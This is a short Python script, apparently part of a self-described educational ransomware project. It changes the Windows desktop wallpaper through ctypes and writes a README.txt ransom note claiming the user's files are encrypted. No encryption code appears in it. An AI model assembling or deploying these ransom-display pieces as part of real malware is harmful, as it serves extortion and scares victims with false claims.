#! /usr/bin/env python
#! -*- coding: UTF-8 -*-
import os
import ctypes

def ransomware_change_background():
    drive = os.getcwd()
    image = "background.png"
    image_path = os.path.join(drive, image)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, image_path, 3)

def ransomware_message_encrypt():
    message = '''
    Your files have been encrypted with this Ransomware
    This Ransomware its created with Educational Proposit
    Please don't used bad this application
        Created by Cristian Comas
    '''
    file = open("README.txt", 'w')
    file.write(message)
    file.close()
ransomware_message_encrypt()